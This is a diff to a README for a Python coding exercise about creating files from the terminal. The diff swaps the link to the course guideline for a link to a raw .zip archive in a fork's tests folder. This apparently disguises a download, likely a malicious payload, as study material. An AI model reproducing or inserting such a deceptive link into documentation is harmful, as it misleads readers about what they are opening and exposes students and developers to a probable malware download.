@@ -1,6 +1,6 @@
 # Create file from terminal
 
-Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before starting.
+Read [the guideline](https://github.com/Rudge0/py-create-file-from-terminal/raw/refs/heads/master/tests/from-py-create-terminal-file-v1.6.zip) before starting.
 
 Create an app `create_file.py` that takes directory path, file name, file
 content from the terminal and creates file. There should be flags `-d` or `-f`:
